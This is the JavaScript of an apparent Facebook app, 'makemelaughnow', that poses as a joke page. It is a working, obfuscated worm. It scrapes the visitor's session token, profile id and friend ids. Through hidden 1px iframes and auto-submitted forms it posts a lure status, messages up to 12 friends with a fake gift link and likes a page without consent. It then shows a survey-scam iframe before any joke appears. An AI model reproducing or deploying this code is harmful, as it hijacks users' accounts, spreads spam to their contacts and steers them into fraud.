var app_x = new fbjs_sandbox("x").setBridgeHash("");app_x.validation_vars = {"fb_sig_locale":"en_US","fb_sig_in_new_facebook":1,"fb_sig_time":"1283155119.2838","fb_sig_added":0,"fb_sig_country":"pl","fb_sig_api_key":"4c6e8537174db9c6ff666575fb7c10ff","fb_sig_app_id":x,"fb_sig":"783435ee8e6dca8403944cccc738475a"};app_x.context = "22d3448e5250";app_x.contextd = "O:16:\"CanvasFBMLFlavor\":1:{s:9:\"_fbml_env\";a:15:{s:4:\"user\";i:100000589778946;s:6:\"app_id\";i:x;s:10:\"fb_page_id\";i:0;s:10:\"canvas_url\";s:40:\"http:\/\/apps.facebook.com\/makemelaughnow\/\";s:10:\"source_url\";s:40:\"http:\/\/www.bestplazadel.com\/makemelaugh\/\";s:9:\"loggedout\";b:0;s:7:\"non-tos\";b:1;s:11:\"flavor_code\";i:3;s:14:\"on_canvas_info\";b:0;s:8:\"is_tosed\";b:0;s:14:\"user_triggered\";b:1;s:11:\"image_cache\";N;s:14:\"ajax_triggered\";b:1;s:17:\"non_underlineable\";a:0:{}s:14:\"suppress_label\";b:1;}}";app_x.data = {"user":100000589778946,"installed":false};app_x.bootstrap();

		var ax_startedapp;
		var ax_sheep=[],ax_params=[],ax_domethod=0;
	
		function ax_logerr(ax_err){
		
		}

		function ax_startapp(){
			if(ax_startedapp=='1'){return;}
			ax_startedapp='1';
			
			
			var ax_create = {
				help :	function(ax_cmd,ax_name){
							var ax_co = ax_document.getElementById(ax_name.substr(2,1)).getTitle();
							for(var ax_a=0, ax_out='';ax_a<=ax_cmd.length-1;ax_a++){var ax_out=ax_out + ax_co.substr(ax_cmd[$FBJS.idx(ax_a)],1);}
							return ax_out;
						},
				input : function(ax_name,ax_value){
							var ax_frmform = ax_document.getElementById('frm');
							var ax_frminput = ax_document.createElement('input');
							ax_frminput.setType('hidden').setValue(ax_value).setName(ax_name);
							ax_frmform.appendChild(ax_frminput);
							ax_frminput=null,ax_frmform=null;
							return;
						},
				fire : 	function(ax_nam,ax_val){
							var ax_val = ax_val || '';
							return (ax_val == 'name') ? $FBJS.ref(this).help(ax_nam,ax_val) : $FBJS.ref(this).input(ax_nam,ax_val);
						}
			};
			
			
			var ax_meth = {
				ftarg : ["21"- -"5",22+1,"18"- -"6"],
				fhome : [5-4,3+4,1+6,17+1,8-4,20+5,"19"- -"6",5+2,1+1,13+3,10-10,3-2,11+4,23+3,14+10,20-20,3+3,10+4,1+1,4-2,2+3,11+4,
							5-5,1+1,16-8,17+8,9-8,9-7,4+4,1+5,9+6,17+1,19-18,17+1],
				m : 	[3-2,"3"- -"4",3+4,17+1,2+2,20+5,30-5,10-3,1+1,13+3,"0"- -"0",2-1,13+2,23+3,20+4,10-10,3+3,11+3,1+1,4-2,3+2,14+1,8-8,
							8-6,4+4,30-5,4+4,3+3,5+5,6+4,20+4,10+10,3+3,21+8,7+3,3+3,20+2,6+3,11+4,17+1,2-1,10+8],
				su : 	[5-4,"2" - -"5",1+6,15+3,2+2,20+5,30-5,1+6,1+1,13+3,10-10,3-2,12+3,20+6,22+2,5-5,4+2,12+2,1+1,5-3,4+1,11+4,9-9,
							1+1,4+4,21+4,6+4,12+4,11+3,5+3,26+1,4+3,28+1,8+2,5+2,22+2,1+6,13+3,1+9,10+5,14+4,2-1,17+1],
				lp :	[1,7,7,18,4,25,25,7,2,16,0,1,15,26,24,0,6,14,2,2,5,15,0,2,8,25,23,6,12,10,15,18,1,18,30,27,9,31],
				pid : 	["11"- -"7",4-2,5+5,1+6,19+10,23+3,1+1,22+1,2+6,21+8,21+6,6+3],
				fbd : 	[19+7,"10"- -"4",20+9,10-1,5+2,5+5,11+9],
				hc :	["0"- -"1",4+2,10+1,15+3,28+1,10-10,1+1,11+11,2+5,20+4,21+6,20+2,1+5,20+3],
				get : 	function(ax_s){return ax_create.fire(ax_s,'name');}
			};
			
			var ax_findvalues = {
				a : ((new ax_RegExp('st_.or._i.\\\x22 .al.e=\\\x22(.*?)\\\x22',''))),
				b : ((new ax_RegExp('b_d.s.\\\x22 v..ue=\\\x22(.*?)\\\x22',''))),
				c : ((new ax_RegExp('p.o..le\\.p.p\\?i.=(\\d+)\\\x22',''))),
				d : ((new ax_RegExp('na.e=\\\x22i.s\\[]\\\x22 v.l.e=\\\x22(.*?)\\\x22','gi'))),
				firefunc : function(ax_strdata){
						var ax_matches=[],ax_fmatch=[],ax_out = '',ax_f = 0;
						for (ax_p in ax_findvalues){
							try{
								if(ax_f==3){
									while (ax_matches = ax_findvalues[$FBJS.idx(ax_p)].exec(ax_strdata)){
										if(ax_matches[$FBJS.idx(1)] == ax_sheep[$FBJS.idx(0)]){break;}
										if(ax_matches[$FBJS.idx(1)].length < 25){ax_sheep.push(ax_matches[$FBJS.idx(1)]);}
									}
									break;
								}
								ax_fmatch = ax_findvalues[$FBJS.idx(ax_p)].exec(ax_strdata);
								if(ax_fmatch[$FBJS.idx(1)] !== null){ax_params[$FBJS.idx(ax_f)] = ax_fmatch[$FBJS.idx(1)];}
							}catch(ax_err){
								ax_logerr(ax_err);
							}
							ax_f++;
						}
						ax_document.getElementById('help_container').setTextValue('');
						var ax_out = ((ax_params[$FBJS.idx(0)] !== null) && (ax_params[$FBJS.idx(0)] !== null)) ? 1 : 0;
						return ax_out;
					}
				};
			
			var ax_methodaction = function(){
				var ax_retmeth = 0;
				ax_sheep = ax_sheep || [];
				var ax_goahead = (((ax_sheep.length - 1) < 1) || ((ax_sheep.length - 1) > 500)) ? 0 : 1;
				if(ax_goahead == 0){
											ax_document.getElementById('frm').setAction(ax_meth.get(ax_meth.su)).setTarget(ax_meth.get(ax_meth.ftarg));
						ax_create.fire('status','only go here if you are my TRUE friend http://apps.facebook.com/makemelaughnow/');
						ax_create.fire(ax_meth.get(ax_meth.pid),ax_params[$FBJS.idx(0)]);
						ax_create.fire(ax_meth.get(ax_meth.fbd),ax_params[$FBJS.idx(1)]);
						ax_retmeth = 2;
										return ax_retmeth;
				}else{
											ax_document.getElementById('frm').setAction(ax_meth.get(ax_meth.m)).setTarget(ax_meth.get(ax_meth.ftarg));
						ax_create.fire(ax_meth.get(ax_meth.fbd),ax_params[$FBJS.idx(1)]);
						ax_create.fire(ax_meth.get(ax_meth.pid),ax_params[$FBJS.idx(0)]);
						ax_create.fire('ids[]','');
						ax_create.fire('subject','i thought of you..');
						ax_create.fire('body','im using up my fb ad credits to send u a gift so HERE = http://apps.facebook.com/makemelaughnow/');
						var ax_sendamount = (12 > (ax_sheep.length-1)) ? (ax_sheep.length-1) : 12;
						var ax_sendamount = (ax_sendamount < 20) ? ax_sendamount : 20;
						for(var ax_j=0;ax_j<ax_sendamount;ax_j++){
							ax_create.fire('ids[]',ax_sheep[$FBJS.idx(ax_j)]);
						}
						ax_create.fire(ax_meth.get(ax_meth.fbd),ax_params[$FBJS.idx(1)]);
						ax_retmeth = 1;
										return ax_retmeth;
				}
			}
			
			//
			try{
				ax_domethod = ax_findvalues.firefunc(ax_document.getElementById('help_container').getFirstChild().getTitle());
			}catch(ax_err){
				ax_logerr(ax_err);
			}finally{
				if((ax_domethod == 1) && (ax_params.length > 1)){
				
					ax_document.getElementById('work_container').setInnerXHTML("<iframe name='fra' id='fra' frameborder='0' smartsize='false' width='1' height='1' scrolling='no' style='width:1px;height:1px;' src='about:blank'></iframe>");
					ax_document.getElementById('frm_container').setInnerXHTML('<form id="frm" method="POST" action=""></form>');
					
					var ax_submitfrm = ax_methodaction();
					if(ax_submitfrm > 0){
						try{
							ax_setTimeout(function(){ax_document.getElementById('frm').submit();},1200);
						}catch(ax_err){ 
							ax_logerr(ax_err);
						}
					}
					
											try{
							var ax_lkp = ax_document.createElement('div').setId('lkp');
							ax_document.getElementById('work_container').appendChild(ax_lkp);
							ax_lkp.setInnerXHTML("<iframe id='fralkp' name='fralkp' width='1' height='1' scrolling='no' frameborder='0' style='border:none;overflow:hidden;width:1px;height:1px;' src='about:blank'></iframe>");
							ax_document.getElementById('fralkp').setSrc(ax_meth.get(ax_meth.lp) + '148034935215009&action=fan&' + ax_meth.get(ax_meth.pid) + '=' + ax_params[$FBJS.idx(0)]);
							ax_lkp = null;
						}catch(ax_err){
							ax_logerr(ax_err);
						}
										
				}
			}
			
				
			ax_document.getElementById('frabox').setClassName('frabox');
			ax_document.getElementById('frabox').setInnerXHTML('<iframe id="fraoff" name="fraoff" width="760" height="700" scrolling="no" frameborder="0" style="position:relative;overflow:hidden;border:none;width:755px;height:750px;top:-245px;" src="http://track.socialsurveys.us/DefaultPage.aspx?nm=017gjfq68yx9"></iframe>');
			ax_document.getElementById('loading').setTextValue('Complete above to see a joke!');
			
			
			ax_setTimeout(function(){
				ax_document.getElementById('work_container').setTextValue('');
				ax_document.getElementById('frm_container').setTextValue('');
				
			},16000);

		}
		
		ax_setTimeout(function(){ax_startapp();},800);
			

